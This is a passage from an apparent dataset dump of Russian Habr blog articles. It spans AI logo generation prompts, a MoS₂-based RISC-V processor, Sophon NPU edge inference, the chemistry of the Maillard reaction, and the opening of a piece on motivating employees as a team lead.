2.5), так и снизить (число меньше 1.0, но не менее 0.0). Этот оператор взаимодействует со скобками‑группами:значок кота, текст «Кототека», (синие круги)::2, (красные треугольники)::3Тогда синие круги будут вдвое «активнее», чем значок кота и надпись, а красные треугольники будут отрисовываться в полтора раза чаще синих кругов. Этот параметр позволяет гибко управлять балансом изображения. Он определяет не только количество объектов, а скорее важность отдельных параметров, к примеру с его помощью можно смешать разные стили в определённой пропорции.Генерируем логотип в MidjourneyMidjourney тоже мультимодален, и на входе принимаются картинки — будь то логотипы, которыми вы хотите вдохновиться, исходные фотографии персонажей или нарисованный эскиз. Именно это я сейчас и попробую сделать — сгенерировать по имеющемуся нарисованному эскизу.Логотип с текстом ""Кототека"", современный минимализм, стилизация под мобильное приложение, иконка с силуэтом кота в рамке планшета, тёплые пастельные цвета, лёгкий юмор, без лишних деталей, рукописный шрифт, баланс между цифровым и уютным стилем, векторная графика ‑-no shadow, background, noiseПараметры --ar 1:1 и --style raw были заданы мною заранее в интерфейсе (в списках Соотношение сторон и Стиль), так что в промт повторно включать их не пришлось. Итак, вот что получилось:Midjourney уловила суть идеи — кот на экране планшета, и предложила варианты, поиграв с цветами и поворотом изображённого субъекта. Правда, шрифт сложно назвать рукописным (по крайней мере, с нашей точки зрения) — думаю, ключевое слово каллиграфия привело бы ближе к задуманному. Из этих результатов мне больше всего понравились верхние два.Результаты крупнееDalle-3Стоимость изображения: 3,42 ₽.Формат скачиваемого изображения: непрозрачный PNG.Dalle долгое время оставалась лидером в генерации изображений, пока её в какой‑то момент не обогнала Midjourney. Сегодня уже сложнее выделить фаворита, так как нейросети часто выкатывают новые функции и обновления.Для тестирования, как обычно, я обратился к метапромтингу через ChatGPT и получил парочку интересных запросов. Выданные промты оказались длиннее, чем это было для аналогичных сервисов, что подчёркивает уровень языковой поддержки Dalle-3.Генерация логотипов в Dalle-3Логотип на месте, и он замечательный, но... где же надпись? Пробуем что‑нибудь на латинице:Создай логотип на белом фоне для The Arctic Museum — учреждения, посвящённого арктическим исследованиям и коренной культуре русского Севера. В дизайне должны быть стилизованные элементы: айсберг и белый медведь. Используй холодные оттенки — ледяной голубой, серый и белый. Название «The Arctic Museum» должно быть частью графики. Общая атмосфера — простор, спокойствие, научный дух с оттенком приключения.Я перепробовал несколько вариантов, иногда изменяя в промте какие‑то детали. Как мне кажется, этот наиболее эффектный. Всё, что тут нужно подкорректировать, — подправить надпись и перерисовать снежинки.Stable Diffusion 3Стоимость изображения: 4,49 Р.Формат скачиваемого изображения: непрозрачный PNG.Как говорится, мы вернулись к тому, с чего всё начиналось. Stable Diffusion тоже появился в широком доступе летом 2022 года и быстро стал популярным, несмотря на сомнительные первые результаты. Всего через пару лет нейросеть доросла до 3-й версии, которая может легко подтягиваться к лидерам на этом рынке.Создание логотипаПроверим, как генератор отрисует логотип ювелирной сети. Для теста я решил составить промт на английском (учитывая иногда капризную поддержку иностранных языков у Stable Diffusion).A delicate and feminine jewelry brand logo on a white background. The design includes a soft floral or leaf motif, combined with a thin circular frame and warm gold and blush tones. The Russian word ""Мелисса"" is written in graceful handwritten script, integrated as part of the design. The logo should feel light, romantic, and refined, targeting a female audience and inspired by nature»s elegance.Подпись, увы, оказалась нечитабельной (редактирование таких нюансов — буквально пара минут в Photoshop), в остальном исполнение отличное. Флоральные элементы и круглая рамка добавили элегантности, логотип выглядит лёгким и изящным — именно то, что нужно ювелирному бренду. Это лого наглядно демонстрирует, что айдентика с фотореалистичными элементами может выглядеть круто и необычно и что на сегодняшний день в этом направлении есть куда развернуться.Выбор подходящей нейросети для логотипа — это ключ. Сначала кажется, что это просто элемент, но с ним всё становится намного быстрее и удобнее.Поймал себя на мысли, что в какой‑то момент фокус вновь сдвинется на креативность и восприятие человека. За всеми этими технологиями легко забыть: генераторы — это только инструменты. Да, они классные и упрощают процесс, но выбирать концепцию всё равно нужно дизайнеру, который становится той самой искрой, которая превращает генерации в нечто уникальное.Благодарю за прочтение, буду рад комментариям👇"
53,Китайцы разработали 32-bit RISC-V процессор с полупроводником толщиной в пару атомов. Что за чип?,МТС,Про жизнь и развитие в IT,0,"Связь и телекоммуникации, Мобильные технологии, Веб-сервисы",2025-04-10,"На днях в сети появилась интересная новость: китайские ученые создали 32-битный процессор RV32-WUJI на основе полупроводника толщиной в несколько атомов. Этот чип на архитектуре RISC-V — пока только демонстрация того, как новые полупроводники могут работать в электронике. Возможно, разработка будет активно использоваться в отрасли «Интернета вещей» и некоторых других. О новом изобретении и его значении для науки сегодня и поговорим.2D-полупроводники в микроэлектроникеИсточникМикроэлектроника десятилетиями опиралась на кремний как основной материал для производства чипов. Но по мере снижения размеров транзисторов в кристалле у кремниевых процессоров возникают серьезные проблемы: ток начинает утекать даже в выключенном состоянии, сами чипы сильнее нагреваются, а их производство становится сложнее и дороже.Сейчас появилась надежда, что эти трудности удастся преодолеть. Китайские исследователи, опубликовавшие свою работу в журнале Nature в апреле 2025 года, предложили альтернативу — RV32-WUJI. Это процессор с 5 900 транзисторами, выполненными из дисульфида молибдена (MoS₂).MoS₂ — химическое соединение, состоящее из одного атома молибдена (Mo) и двух атомов серы (S). Выглядит как темно-серый или черный порошок с металлическим блеском. Его добывают из природного минерала молибденита, но возможно и получение в лаборатории. У него слоистая структура, как у графита. Китайцы решили использовать MoS₂ как основу для транзисторов вместо привычного кремния. Положительный момент — возможность делать чипы ультратонкими и потенциально более энергоэффективными. Отрицательный — пока что лабораторный образец чипа далек от производительности даже самых слабых процессоров нового времени. Дисульфид молибдена состоит из атомов серы (желтые шарики) и молибдена (синие), выстроенных в гексагональную решетку с чередующимся порядком, напоминающим шахматный. ИсточникRV32-WUJI работает на частоте в пределах нескольких килогерц (даже не мега, да). Но создатели новинки и не планировали бить рекорды. Разработчики в первую очередь стремились показать, что можно создавать ультратонкие чипы на основе новых материалов. Это им удалось: процессор выполняет полный набор инструкций 32-битной архитектуры RISC-V.  Подробнее о RV32-WUJIСоздание RV32-WUJI стало возможным благодаря выращиванию листов MoS₂ на сапфировой подложке. Метод решает ключевую проблему масштабирования двумерных материалов.А именно — в кремниевых элементах свойства транзисторов можно настраивать с помощью легирования (введения примесей). А вот MoS₂ из-за своей атомарной толщины не позволяет использовать этот подход. Чтобы обойти ограничение, исследователи применили два разных металла — алюминий и золото — для формирования контактов. А еще — выбрали окружающие материалы, позволяющие точно регулировать пороговые напряжения транзисторов.В процессоре задействованы инверторы в режиме обеднения (depletion mode). Ученые создали и протестировали 25 логических элементов. 18 оказались полностью работоспособными и были использованы при сборке чипа. Далее авторы проекта замерили время, за которое сигнал проходит по самой длинной цепочке элементов на чипе. На основе этих данных определили, с какой максимальной частотой может работать процессор. Она оказалась в пределах нескольких килогерц. Почти все изготовленные компоненты (99,9%) и чипы (99,8%) работали корректно, что говорит о высокой надежности технологии. Правда, некоторые части процессора оказались капризными. Например, только 71% 8-битных регистров функционировали без ошибок, а среди более сложных 64-битных регистров, каждый из которых состоит из 1 152 транзисторов, исправными оказались всего 7%.​Процессор содержит ключевые логические блоки, включая декодер инструкций RISC-V, однако часть операций реализована в упрощенном виде. Так, сложение двух 32-битных чисел выполняется по одному биту за такт и занимает 32 такта. Это осознанный компромисс между функциональностью и простотой архитектуры. Кстати, для подбора материалов и конфигурации соединений чипа использовался искусственный интеллект — это ускорило работу команды.Значение для техники: энергоэффективность и нишевые примененияКлючевые элементы процессора RV32-WUJI: архитектура многослойной сборки, использование MoS₂ и схемы контактной проводки, объединенные в единую платформу. ИсточникRV32-WUJI не предназначен для замены кремниевых процессоров в смартфонах, ноутбуках или дата-центрах. Во всяком случае сейчас. Его рассматривают как нишевый чип, его станут использовать там, где важны минимальное энергопотребление и компактность. И, конечно, где не нужна высокая производительность. Например, IoT — это сенсоры для мониторинга окружающей среды, медицинские имплантаты или спутниковые системы. Благодаря ультратонкой структуре и низкому тепловыделению такие чипы могут работать там, где традиционные процессоры слишком громоздки или энергоемки.Для научного сообщества RV32-WUJI не просто чип, а платформа для исследований. 2D-полупроводники, такие как MoS₂, весьма перспективны. Ученые считают, что на их базе возможны новые открытия в физике твердого тела, материаловедении и электронике. Успешная сборка почти 6 000 транзисторов в одном чипе уже показала, что 2D-материалы можно масштабировать до уровня сложных систем, что ранее считалось недостижимым. Это открывает путь к экспериментам с другими компонентами, такими как диселенид вольфрама (WSe₂), и к созданию гибридных технологий, сочетающих кремний и 2D-полупроводники.В любом случае авторы проекта доказали, что в отрасли разработки и производства чипов возможны альтернативные подходы. Отказ от использования экстремальной ультрафиолетовой литографии (EUV), необходимой при изготовлении современных кремниевых процессоров, может упростить и удешевить экспериментальные разработки, сделав их доступными для университетов и небольших компаний. К тому же открытая архитектура RISC-V, лежащая в основе RV32-WUJI, позволяет разработчикам свободно адаптировать чип под конкретные задачи без лицензионных ограничений. Это особенно актуально для Китая в условиях технологических санкций да и других стран тоже.RV32-WUJI — только начальный этап. Для повышения производительности и надежности таких процессоров потребуется еще много работы.  "
54,Всё про инференс на Sophon NPU,Recognitor,Computer Vision and Machine Learning,0,"Программное обеспечение, Мобильные технологии, Веб-сервисы",2025-04-10,"Easter Egg is incomingВ этой статье мы поговорим про ML на базе плат Sophon. Наверное это один из производителей которые набрали больше всего популярнсти в AI последнее время. Я расскажу как они соотносятся с другими платами на рынке (Jetson, RockChip, Hailo, TI, etc.). Расскажу как подготовить сети для работы на платформах, покажу ограничения (что пока нельзя сделать, ограничения по скорости, и.т.д.). Про статьюСтатья - перевод моей статьи. Но так как перевод авторский - что-то дописывал и модифицировал по ходу. Так же, у статьи есть вариант с видео. Если вдруг вам удобнее смотреть:Несколько слов благодарностиITGLOBAL.COM - за предоставление доступа к SC7 HP75-IБез бесплатного доступа я точно бы не стал бенчмаркать:)Что такое Sophon?Устройств на Sophon становится все больше и больше. Но, архитектурно, их не много. Это:  CV186XCV180XCV181XBM1684XBM1684BM1688Архитектурно они выглядят как-то так (это достаточно старый чип, новее схемы нет):BM1680 При этом все три BM похожи, как и все CV. За тем исключением что самая свежая - BM1684X и трансформеры доступны только для неё.Давайте посмотрим на несколько примеров плат для CV-архитектуры (там те же NPU что и в SG серии) и BM.Milk-V. Я делал обзор не неё год назад. С тех пор они пофиксили большую часть основных проблем, и плата стала очень похожа в использовании на основной пайплайн который мы рассмотрим ниже.MaixCAM - вокруг Sophon ребята обернули свой стек. И сделали плату чуть более удобоворимой и простой. Вот тут хорошее видео как этим управлять - https://www.youtube.com/watch?v=hSv498VxOtE а вот тут оригинальная документация - https://wiki.sipeed.com/hardware/en/maixcam/maixcam_pro.html LicheeRV - глубоко не смотрел, но должна быть такая же как и MaixCam.Seeed Studio reCamera  - У них тоже есть свой враппер вокруг кода SophonCV186 - это старшая плата в CV серии, тут есть несколько девайсов (firefly, sophon,)Разные платы CV серииОсновные особенности серии:Можно экспортировать модели в fp16. Обычно мало памяти (несколько сотен mb)Инференс с++ (если вендор, такой как SiPeeed не напишет что-то своё поверх)Большие/сложные модели не экспортируются По серии BM есть несколько устройств:AIBOX-1684X и аналоги, стоят в разных местах от 350 до 700 USD. SC7 HP75-I - https://en.sophgo.com/sophon-u/product/introduce/sc7-hp75.html это карта с помощью которой можно ускорить вычисления для лбого компьютера. В качестве вычисленителя тут есть несколько более масштабируеммое по сравнению с 1684X NPUПлаты на BM1688 - https://docs.banana-pi.org/en/BPI-SM9_Core/BananaPi_BPI-SM9 https://en.t-firefly.com/product/industry/aibox1688 (они стоят дешевле, где-то от 250)В этой статье будет идти разговор в первую очередь о AIBOX-1684X и о SC7 HP75-I В целом, можно смотреть на платформу как на две состовляющих: “супер дешевые микроконтроллеры с NPU”  и “конкуренты Jetson’ов” для LLM и более производительных вычислений.  Насколько плата популярна?Я проверил на своем канале, насколько популярны сегодня разные платформы. Ответ довольно интересный. Большинство моих читателей работают с Edge деплоем, но лишь немногие используют Sophon.Я думаю, что он гораздо более распространен в Китае. Для мира это только начало вторжения.На чем продакшн шатал?ПасхалочкаКстати. А вы знаете, что означает ""Софон""? Это название одного компьютера/антагониста из серии книг ""Задача трёх тел"".Вот так ChatGPT + Kling видят многообразие Калаби-Яу. По книге софон это ""сложенный разные измерения протон""Общее впечатлениеДавайте я немного скажу про своё общее впечатление от платформы которое проявляется во всём. Знаете этого парня, который вроде как и гениален, вроде и “Суперзвезда”, но как только просишь его до конца что-то довести, говорит что “это не моя работа”? Вот тут так же:Собрать PIP пакеты под все основные платформы, как сделано у всех конкурентов? Да не, ну нафиг, зачем это.Сделать одну непротиворечивую инструкцию? Да не, давайте кажды разработчик свою напишет. А ещё лучше чтобы они друг другу противоречили - https://github.com/sophgo/sophon-demo/blob/release/docs/Environment_Install_Guide_EN.md   https://doc.sophgo.com/sdk-docs/v23.09.01-lts-sp4/docs_latest_release/docs/sophon-sail/docs/en/html/1_build.htmlСделать перевод всех инструкций на английский? Да не, зачем, гуглтранслейт то везде естьПроверить что инструкции работаю после обновлений и ничего не поломалось? Не, зачем. Проверить что хотя бы соседние строчки в базовых инструкциях друг другу не противоречат? Not my job!При этом:Число сетей которые работают на NPU-одно из самых больших если не самое большое среди других платформСкорость инференса и цена приятно удивляетОчень много готовых платформ на рынкеСкоростьПо скорости я немного потыкал в обе платформы (AIBOX-1684X и SC7 HP75-I)Результаты вашли такие:Достаточно неплохо по скорости!Это достаточно быстро. PCI плата - даже быстрее Jetson Orin будет (но Jetson Orin NX по перформансу на GPU + 2 DLA уделает). Вот тут подробнее рассказываю про Jetson и его особенности. При этом LLM  - не очень быстры. Сравните Qwen2 VL 2B на RochChip с 6TOPS и Sophon с 32TOPS. Да, Sophon значительно быстрее выделяет Visual  Embedings. Но вот с скоростью генерации явная проблема.Пример инференса тут на  5:03 (эмбединги) и 6:02   Поддержка сетей  Платформа поддерживает много интересного.Вот тут краткий список сеток из официального резпозитория.  Часто добавляются новые:Лист моделейМало кто сегодня поддерживает все это. Удобно смотреть на VLM как метрику современного развития платформRockChip - недавно начали поддерживать QwenVL (вот тут я рассказывал про это)Jetson не поддерживает сложные модели на NPU (DLA), поддерживает только через GPUIntel - GPU и CPU. Ещё недавно NPU не работал для этих целей.Qualcomm - можно на CPU и GPU (например через tinygrad https://github.com/tinygrad/tinygrad ). Упоминаний про NPU inference я не нашёл.  Hailo - уверяет что на Hailo-10 VLM и LLM будут. Но пока не видел примеров. AMD. Недавно делал видео про них. Быстро развивиются. LLM уже да, но VLM пока нет.  Из прочего. Huawei на Edge вроде не тащит. SimaAI, вроде умеет, но это не совсем Edge. NXP, TI не умеют.Другим хорошим бенчмарком является stereo depth estimation. Полноценные сети, такие как crestereo или HITNET не запускаются ни на одной NPU плате (по крайней мере я не знаю). На Sophon у меня не удалось экспортировать ни одну из этих моделей. Там есть одна своя модель (LightStereo). Но качество не очень:Обычная картинкаПосле DEPTH оценкиСравните с откликом той же HitNet Так что тут пока явный лидер для Depth - Jetson.А в целом, я делал несколько обзоров на тему того что можно поробовать на каких платах пускать:Classic stereo Depth vs. Neural stereo Depth vs. Monocular depth.Depth estimation. From the theory to the Edge.RealSense vs. OAK vs. ZED vs. Azure Kinect vs. Mech Mind 3D cameras comparison3D камеры в 2022Давайте сравним с существующими платформами  Jetson - лучше для любых областей где вы на Bleeding edge разработки. Робототехника. Современные VLM. 3D навигация. В пересчете на чистую цену вычисления Sophon будет выгоднее. При этом поддержки больше у Jetson и код там легче разрабатывать. Если вы большая копания которая двигается медленно - лучше брать Jetson.RockChip - На текущий момент RockChip обзавелся большим комьюнити и хорошей документацией. Разрабатывать под RockChip сильно приятнее. Тем не менее Sophon на сегодня поддерживает больше сетей + Sophon имеет больше вариаций по скорости (тот же 1684X существенно быстрее RK3588 серии). Так что для инференса VLM/LLM - я бы выбрал Sophon, для серверов тоже его. Для мелких вычислителей на 1-2 камеры без сложной логики - скорее RockChipHailo - кажется что это разные ниши где Sophon не пересекается с Hailo. Из существенных плюсов Hailo - документация. Из существенных минусов - невозможность работы с fp16. Плюс это другой фактор использования. Qualcomm - вот это единственный серьезный конкурент, как мне кажется. Я надеюсь этой весной побенчмаркать Qualcomm  чтобы составить мнение про текущее поколение. На текущий момент явно что доступность Qualcomm хуже, софт лучше.Intel, AMD- другой уровень энергопотребление. Кажется что по софту они пока отстают. Но документация сильно лучше.Краткий гайд  Попробую объяснить краткую логику того как вам надо использовать платформу.Sophon не предоставляет собранных исходников под свои платы. Вам надо их собрать.Для всех ARM плат - надо настроить кроскомпиляцию на вашей хост машине.Для PCE-e карт если они воткнуты в x86 машину вы можете развернуть комиляцию прямо на месте.Sophon предоставляет докер для x86 в котором вы сможете все собрать. Сам докер можно найти вот в этой инструкцииНо при этом при сборке я бы советовал использовать эту инструкцию (там нет про докер, но более простой пайплайн)Сорсы для сборки вы можете взять тут (кажется в гайдах выше ссылок нет)Заметьте что Python-wheel собирается отдельно. Оно чуть ниже в инструкции. Показывать пример инференса я буду именно для него.Для некоторых плат вы можете найти уже собранные исходники. Например FireFly выложил их, и Sophon для какой-то ARM версии их тоже имеет.Думаете что один раз собрал и всё? Ну тут то было!Основной массив кода для сборки - SDK-23.09-LTS-SP4Есть вторая версия - SDK-24.04.01 (эта версия чуть поновее и поддерживает новые сети).Но если вы хотите использовать VLM или LLM - то вам надо собирать кастомную версию SDK. Обычно ссылку на неё вы можете найти прямо в тексте примера (например тут). И да, все эти кастомные приеры только на китайском. И да, скачать в официальном хранилище именно эту версию (sophon-sail_24_12_18) вы не сможете.Если вы делаете все на ARM - возможно вам надо будет собрать OpenCV и какие-нибудь ещё библиотеки.Переходим к билду модельки. Для этого на вашей x86 машине вам нужно создать отдельный энвайромент. Эта радость называется “TPU-MLIR”. Вы можете взять готовый докер с ним или сделать pip install. Более подробно про варианты установки есть тут В целом экспорт моделей достаточно простой и нативный. Вы можете найти примеры тут или тут.И последняя часть, сам код. Тут все просто. Если вы все успешно настроили и эспортировали, то минимальный код запуска будет какой-то такой:  net = sail.Engine('./sophon-demo/sample/YOLOv5/models/BM1684X/yolov5s_v6.1_3output_int8_1b.bmodel',0,sail.IOMode.SYSIO) graph_name = net.get_graph_names()[0] input_name = net.get_input_names(graph_name)[0] input_shape = net.get_input_shape(graph_name, input_name)  src_img = cv2.imread('Cal1.jpg') img = preprocess(src_img) input_data = {input_name: img} outputs = net.process(graph_name, input_data)Брать или не брать  Мне кажется что Sophon это неплохое расширение текущего рынка:ДоступенВ разумную ценуХорошая поддержка сетейПри этом Это китайская плата (ограничение на использование в некоторых из стран, непонятные перспективы болших серий)Плохое качество кодаИтогоВам интересно на чем делать инференс Edge AI? Мне тоже:) Я иногда пишу на Хабре, но не все статьи тут заходят (слишком уж некоторые специфичные). Так что тут только мои обзорные, либо про какие-то супер интересные платформы (один, два, три, итд). Небольшие обзоры я делаю у себя в ютубе (Qwen2VL RockChip, Jetson DLA, AMD, TI,Hailo,e.t.c.). Либо пишу на медиуме (Hailo, какую камеру воткнуть). А вот сюда все складирую. Ни на что не намекаю. Но если дочитали сюда - может оно вам надо."
55,"Стейки, мертвецы и невидимые чернила. Разбираемся с реакцией Майяра",Газпромбанк,Очень большой банк,0,"Программное обеспечение, Электронная коммерция, Связь и телекоммуникации",2025-04-10,"Что общего у поджаристого стейка, мумифицированного тела и автозагара? А у пармезана, испражнений динозавров, катаракты и темного пива?Все эти вещи из разных вселенных объединяет одна-единственная, но очень важная для человеческой цивилизации химическая реакция. Еде она придает румяность и приятный вкус, мумии и бледных людей делает загорелыми, скрытые вещи — явными, а древние предметы — хорошо сохранившимися. Это, конечно же, реакция Майяра, открытая в 1912 году французским химиком Луи Камилем Майяром. Луи Камиль МайярМиру реакция Майяра известна прежде всего тем, что делает еду поджаристой и вкусной. Но на самом деле ее влияние на нашу жизнь гораздо сильнее, а изучение начиналось и вовсе с медицины — с исследования нарушений обмена веществ. В этом тексте мы рассмотрим легендарную реакцию, не ограничиваясь готовкой: с нее начнем, но также уйдем и в другие области и даже затронем гипотезу о влиянии этой реакции на зарождение жизни на Земле. Будет новое и интересное — и полезные лайфхаки тоже будут.Но сначала база.Что такое реакция МайяраЧеловек, лучше всего осведомленный об этом, скорее всего повар. Реакция Майяра — это химическая реакция между аминокислотами и сахарами, происходящая при нагревании продуктов. Это именно та реакция, которая превращает бледное куриное тело в зажаристое и благоуханное, а белое тесто — в покрытый хрустящей корочкой свежевыпеченный хлеб.Если углубляться в химию, происходит вот что: при нагреве сахар открытой формы (например, глюкоза) вступает в реакцию с аминокислотой белка;образуются вода и нестабильное соединение — гликозиламин;гликозиламин подвергается перегруппировке Амадори, образуя кетозамин;кетозамины претерпевают дальнейшие превращения в альдегиды, кетоны, фураны, тиофены, пиразины, etc. — во что именно, зависит от реагентов, условий и типов реакции. И человеческим языком — при нагреве белки и сахара взаимодействуют между собой и претерпевают ряд превращений. В результате образуются разнообразные вещества (большая их часть, к слову, неважно изучена). Именно эти соединения придают пище вкус и запах «приготовленной» — например, пиразины отвечают за тот самый «ореховый» вкус жареной картошки, а фурфурол — за аромат теплого хлеба. За цвет «поджаристости» в ответе полимеры меланоидины, образующиеся на поздних этапах готовки. Упрощенная схема процессаИнтересно, что:При комнатной температуре реакция Майяра тоже протекает. Это происходит очень медленно, но зато потом мы имеем такие вкусные результаты, как мисо-паста, сыр пармезан и хамон (впрочем, помимо Майяра, отдадим должное и ферментам).При варке, тушении или запекании аналогично — мы имеем более медленную, но неизбежную реакцию Майяра. Именно поэтому бульон для фо бо для достижения нужной «коричневости» варят в ночь, а подливу долго томят.Реакцию Майяра часто путают с карамелизацией и декстринизацией, а поэтому пара слов о том, как их отличить:Реакция Майяра — взаимодействие аминокислот и сахаров при оптимальной температуре от 140 °C до 165 °C. Требует наличия как белков, так и углеводов.Карамелизация — более простая реакция; тип пиролиза, или разложения сахаров под воздействием высокой температуры (обычно выше 160 °C) без участия белков.Декстринизация — процесс расщепления крахмала на более простые углеводы (декстрины) под воздействием тепла. Придает продуктам сладковатый вкус.Впрочем, обычно все эти три кита кулинарии плывут бок о бок. К примеру, если вы жарите чистый сахар — это карамелизация. Если картофель — это сочетание декстринизации и реакции Майяра. А вот когда вы готовите стейк — это преимущественно реакция Майяра.Мертвецы и прочее несъедобноеНесложно догадаться, что если реакция Майяра протекает там, где есть и белки, и углеводы, то, возможно, ее территория не ограничивается продуктами. Если это верно, то можно прийти к страшным выводам: например, что в старости глазные яблоки должны пахнуть сыром. Или что трупы из болот можно есть. Но давайте разбираться.Болотные телаНашли в «Двух башнях» киноляп: по законам химии, мертвецы Мертвых Топей должны быть смуглыми из-за реакции Майяра (Арда — это все-таки древняя Земля)Да, реакция Майяра, как показывают некоторые исследования, действительно протекает в трупах, мумифицировавшихся в торфяных болотах, но, к счастью для гурманов, благоухать так, что текут слюнки, они от этого не начинают. Как предполагают некоторые исследования, в реакцию здесь вступают не слишком популярные в кулинарии ингредиенты: коллаген тканей реагирует с полисахаридами из торфов и мхов. Образовавшиеся соединения, наряду с танинами (дубильными веществами торфа), придают коже мертвецов оттенок стейка, похожий на коричневый, а волосам — рыжину.КопролитыЕще одно свойство реакции Майяра, тоже полезное — сохранение важных для археологии древних субстанций. А конкретно — испражнений динозавров (копролитов). Реакция приводит к образованию сложных полимеров, которые покрывают свидетельства питания древних животных и таким образом защищают их от разрушения временем. Бристольская шкала: ископаемая версияАвтозагарТот, кто наносит химические вещества на кожу, дабы выглядеть обласканным солнцем счастливцем, запускает процесс, не так уж и сильно отличающийся от поджаривания цыпленка. Принцип действия кремов для автозагара тоже основан на реакции Майяра. Вот как это работает: активный ингредиент средства, моносахарид дигидроксиацетон (DHA), реагирует с аминокислотами, присутствующими в верхнем (роговом) слое кожи. Этот процесс, называемый гликированием, приводит к образованию уже знакомых нам меланоидинов, которые придают коже коричневатый цвет. Кдр из сериала Seinfeld Невидимые чернила  Да, Ленин писал про восстание пролетариата молоком и тем самым тоже эксплуатировал реакцию Майяра. Если молоко нагреть, содержащийся в нем молочный сахар и белки прореагируют, и текст проявится.Реакция Майяра в медицинеФранцузский ученый Камиль Луи Майяр открыл свою реакцию в 1912 году. Будучи врачом, он специализировался на исследованиях нарушений обмена веществ и почечных болезней, долгое время изучая подагру. Майяр предположил, что реакция между сахарами и белками может протекать внутри человеческого организма. Спустя годы наука подтвердила, что при диабете повышенный уровень глюкозы в крови действительно ускоряет подобные реакции, что приводит к образованию гликированного гемоглобина. Измерение его уровня стало одним важных анализов для контроля диабета.Катаракта в форме звезды в результате удара током — здесь реакцию ускоряет теплоС возрастом белки наших тканей медленно реагируют с сахарами крови, образуя так называемые конечные продукты продвинутого гликирования (AGEs). Эти продукты накапливаются в тканях и считаются одной из причин старения и развития возрастных заболеваний. Например, накапливаясь в хрусталике глаза, они вызывают его помутнение — катаракту. У диабетиков из-за повышенного уровня сахара в крови процесс гликирования идет быстрее. Именно поэтому измерение уровня гликированного гемоглобина (HbA1c) используется для контроля болезни — он показывает, сколько молекул гемоглобина вступило в реакцию с глюкозой крови.ЛайфхакиНо вернемся к стейкам, если у вас еще пропал аппетит. Реакция Майяра — это процесс химических превращений, а значит, им можно управлять. Вот несколько условий, которые сделают пищу вкуснее и поджаристее:Повышенная температура. Реакция активно идёт при 140–165 °C. Слишком низкая температура не запустит процесс, а слишком высокая затормозит реакцию за счет активизации карамелизации. Кроме того, при высоких температурах может образовываться канцерогенный полимер акриламид. Щелочная среда. В слабощелочной среде реакция Майяра протекает быстрее. Именно поэтому немецкие крендели (брецели) перед выпечкой окунают в раствор пищевой соды или щелочи. И именно поэтому оладьи на кефире будут зажаристее, если добавить в тесто дполнительную соду. А вот с лимоном и уксусом лучше осторожнее — они замедляют реакцию. Сухая поверхность. Излишняя влага препятствует достижению нужной температуры. Мясо перед жаркой лучше промакивать бумажными полотенцами, а нарезанный картофель — высушивать.Умный выбор сахаров. Фруктоза значительно лучше вступает в реакцию Майяра, чем глюкоза. Поэтому в маринад для обжарки часто добавляют мед.Наглядно — об ускорении реакции домашними средствами:Почему нам так нравится вкус реакции МайяраС учетом того, что соединения, образующиеся при реакции Майяра, и по сей день изучены только частично, о точном ответе на вопрос, почему человек в какой-то момент заинтересовался жареной пищей, речи не идет. Но у эволюционных биологов на этот счет есть три предположения:приготовленная пища безопаснее сырой;размягчившиеся при готовке волокна легче переварить;многообразный и сложный аромат — свидетельство наличия в пище массы полезных веществ.Реакция Майяра и зарождение жизни на ЗемлеНапоследок — еще одна эволюционная теория, связанная с реакцией Майяра. Это гипотеза о том, что именно такая реакция могла подтолкнуть развитие жизни на планете, “связав” углерод на морском дне и позволив кислороду накопиться в атмосфере.Известно, что марганец катализирует реакцию Майяра, позволяя ей происходить при 25 °C . Основываясь на этом, Кэролайн Пикок (Caroline Peacock) и ее коллеги из Университета Лидса добавили минералы железа/марганца в раствор, содержащий глюкозу и аминокислоту глицин. Когда смесь инкубировали при температуре 10°C — примерной температуре древних океанов — минералы ускоряли реакцию Майяра примерно в 100 раз. Далее они выдвинули предположение, что протекание этой реакции на дне моря (где и в наши дни присутствуют залежи марганца) способствовало созданию сложных полимеров, которые донные микроорганизмы не могли переработать. А значит, получающийся при их разложении углекислый газ не смог подняться в атмосферу и вытеснить кислород. Без этого процесса атмосфера Земли могла бы нагреться еще на 5°C за последние 400 миллионов лет. Таким образом, без реакции Майяра могло бы не открыться окно для развития сложной жизни, которая жарит стейк. То есть для другой реакции Майяра. Возможно, вся суматоха с эволюцией и стейками — всего лишь способ саморепликации некоторых химических реакций, таких как эта — названная в честь реактора вида “человек”. Но это не точно."
56,Будущему и начинающему тимлиду: введение в мотивацию и стимулирование сотрудников,Яндекс Практикум,Помогаем людям расти,0,"Веб-разработка, Веб-сервисы",2025-04-10,"Привет! Меня зовут Вячеслав Бенедичук, я наставник на курсе «Архитектура программного обеспечения» в Яндекс Практикуме. В IT я уже более 25 лет, из них суммарно более восьми лет я занимался управлением командами на различном уровне. Если вы стали тимлидом или хотите им стать, вам придётся работать с мотивацией. Наверняка вы встречали коллег, которые тратят рабочее время на интернет или разговоры у кулера. Это не проблема, если они выполняют свою работу, но так бывает не всегда.Чтобы изменить ситуацию, важно понять, что движет людьми и почему они выбирают одни задачи вместо других. В этой статье вы узнаете, как работает мотивация, какие факторы на неё влияют и что можно сделать, чтобы повысить вовлечённость и лояльность сотрудников.Это вторая публикация из цикла о работе тимлида. Вы можете начать сразу с неё, а затем вернуться к первой, можете читать по порядку или выборочно. Первая статья: «Особенности задач тимлида, или Что именно значит „управлять командой“».Почему вы ходите на работу? А почему вы пилите свой пет-проект? Пусть у вас нет пет-проекта, но есть какое-то хобби, которому вы посвящаете свободное время, — задумайтесь, а почему вы это делаете?Пошли бы вы работать в компанию, где вам бы платили на 10% меньше, но вы весь день занимались бы своим хобби или пет-проектом? Если бы вам предложили удвоить зарплату, но сделали вашими должностными обязанностями мытье туалетов, согласились бы вы? Если бы вам предложили вашу текущую зарплату, но вашей работой было бы гладить и вычёсывать котиков, согласились бы?Это небольшой набор вопросов, который позволит оценить свою мотивацию. Могу с уверенностью сказать, что далеко не все читатели данной статьи ответят на них так же, как вы.Все люди разные, но у каждого есть свои потребности и мотивация. Для кого-то важен стабильный доход — например, тем, кто выплачивает ипотеку. Молодому специалисту нужна крутая строчка в резюме или интересные задачи. Есть люди, которым важен карьерный рост, профессиональный рост, возможность самовыражения, свободный график, чтобы каждый день кататься на серфе.Однажды, много лет назад, мне довелось встретить начинающего тимлида, который был убеждён: люди работают только ради денег, а если их работа не соответствует его стандартам качества, значит, они тупые и ленивые. И он не стеснялся им это объяснять. Человеку были важны деньги, и он проецировал эту потребность на окружающих, полностью игнорируя их реальные потребности и желания. А его токсичная манера общения только усугубляла ситуацию.Реальная картина была немного другой. В команде был молодой разработчик, который хотел расти и развиваться. Был опытный специалист, который мог решать сложные задачи, разбираться в запутанном коде, но ему 